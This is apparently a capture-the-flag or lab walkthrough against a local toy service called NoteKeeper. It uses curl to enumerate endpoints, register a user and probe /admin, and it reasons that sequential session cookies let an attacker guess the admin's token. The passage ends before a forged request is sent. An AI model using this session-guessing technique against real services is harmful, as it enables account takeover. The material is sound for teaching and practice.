# Finding the Bug

## Enumerate the App

```
curl http://localhost:8080/
```

```json
{
  "service": "NoteKeeper v1.0",
  "endpoints": [
    "POST /register  -- {\"username\": \"...\", \"password\": \"...\"}",
    "POST /login     -- {\"username\": \"...\", \"password\": \"...\"}",
    "GET  /profile   -- returns your username (session required)",
    "GET  /admin     -- admin only"
  ]
}
```

## Register and Observe the Cookie

```
curl -s -X POST http://localhost:8080/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"pass"}' \
  -D -
```

```
HTTP/1.0 201 Created
Set-Cookie: session=session_2; Path=/
```

The token is `session_2`. The counter is visible in plain text. Someone registered before you and received `session_1`.

## Probe /admin Without Auth

```
curl -s http://localhost:8080/admin
```

```json
{"error": "No valid session"}
```

## Check What /admin Returns for a Normal User

```
curl -s http://localhost:8080/admin -H 'Cookie: session=session_2'
```

```json
{"error": "Admin only"}
```

The app distinguishes between "no session" and "wrong role." That means session_1 is a valid session for a different role. The lowest-numbered token is the most likely to belong to the first user created: admin.
